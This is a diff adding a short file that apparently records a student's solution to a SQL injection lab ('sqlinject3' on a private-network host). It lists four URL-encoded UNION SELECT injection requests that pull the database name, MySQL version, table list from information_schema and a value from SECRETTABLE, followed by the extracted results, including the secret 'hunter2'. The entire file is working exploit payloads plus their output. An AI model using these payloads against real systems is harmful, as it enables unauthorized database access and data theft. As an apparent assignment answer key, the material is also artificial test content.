@@ -1,0 +1,9 @@
+http://172.27.16.3:33414/c011a736/sqlinject3/index.php?id=%25%27+and+1%3D1+union+select+null%2Cnull%2Cdatabase%28%29+%23
+http://172.27.16.3:33414/c011a736/sqlinject3/index.php?id=%25%27+and+1%3D1+union+select+null%2Cnull%2Cversion%28%29+%23
+http://172.27.16.3:33414/c011a736/sqlinject3/index.php?id=+%25%27+and+1%3D1+union+select+null%2Cnull%2CGROUP_CONCAT%28table_name%29+FROM+information_schema.tables+where+table_schema%3Ddatabase%28%29+%23+
+http://172.27.16.3:33414/c011a736/sqlinject3/index.php?id=%25%27+and+1%3D1+union+select+null%2Cnull%2Csecret+FROM+SECRETTABLE+group+by+id+%23
+
+Name: proj2_piprotar_xtra_cr3dit
+Version: 5.7.27-0ubuntu0.18.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret: hunter2
